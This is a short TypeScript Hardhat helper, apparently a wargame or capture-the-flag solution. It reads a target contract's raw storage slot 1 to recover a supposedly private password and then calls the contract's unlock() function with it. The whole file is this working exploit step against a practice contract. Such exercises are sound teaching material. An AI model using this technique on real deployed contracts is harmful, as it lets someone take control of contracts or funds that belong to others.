import { expect } from "chai";
import { ethers, waffle } from "hardhat";

const helper = async (victim: any) => {
  const provider = waffle.provider;
  const storage = await provider.getStorageAt(victim.address, 1);
  await victim.unlock(storage);
};

export default helper;
